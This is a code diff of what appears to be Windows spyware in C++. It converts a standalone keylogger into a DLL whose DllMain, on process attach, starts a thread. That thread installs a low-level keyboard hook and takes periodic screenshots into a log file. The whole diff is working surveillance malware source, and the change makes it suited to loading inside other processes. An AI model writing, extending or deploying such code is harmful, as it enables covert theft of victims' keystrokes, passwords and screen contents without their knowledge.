@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <cstdio>
 
 LPSTR TEMP = new CHAR[MAX_PATH];
 LPSTR LOGFILE = new CHAR[MAX_PATH];
@@ -158,30 +159,53 @@ setup() {
   CloseHandle(hf);
 }
 
-int WINAPI
-wWinMain(
-    HINSTANCE hInstance,
-    HINSTANCE hPrevInstance,
-    PWSTR pCmdLine,
-    int nCmdShow
-) {
+void begin() {
+  UINT_PTR timer;
+  HHOOK keyboardHook;
+  UINT min = 60 * 1000;
+  MSG msg;
 
   setup();
 
-  UINT min = 60 * 1000;
-  UINT_PTR timer = SetTimer(NULL, 0, 2 * min, (TIMERPROC) screenshot);	// setup a 2 min loop
-  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, 0, 0);
+  timer = SetTimer(NULL, 0, 2 * min, (TIMERPROC) screenshot);    // setup a 2 min loop
+  keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, Keylogger, 0, 0);
 
-  PostMessage(NULL, WM_TIMER, 0, 2 * min);		// take screenshot on start
+  PostMessage(NULL, WM_TIMER, 0, 2 * min);        // take screenshot on start
 
-  MSG msg;
   while (GetMessage(&msg, NULL, 0, 0)) {
     TranslateMessage(&msg);
     DispatchMessage(&msg);
 
-	if (msg.message == WM_TIMER)
-	  screenshot(NULL, WM_TIMER, 0, 2 * min);	// first screenshot
+    if (msg.message == WM_TIMER)
+      screenshot(NULL, WM_TIMER, 0, 2 * min);    // first screenshot
+  }
+}
+
+BOOL APIENTRY
+DllMain (
+  HANDLE hModule,
+  DWORD ul_reason_for_call,
+  LPVOID lpReserved
+) {
+
+  // FILE* file;
+  // fopen_s(&file, "C:\\sss.log", "w");
+
+  // this main should not run more than 300ms
+  switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+      // fprintf(file, "DLL Attach\n");
+      CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) begin, NULL, 0, NULL);
+      break;
+    case DLL_PROCESS_DETACH:
+      // fprintf(file, "DLL Detach\n");
+      // KillTimer(NULL, timer);
+      // UnhookWindowsHookEx(keyboardHook);
+      break;
+    default:
+      break;
+
   }
 
-  return 0;
+  return TRUE;
 }
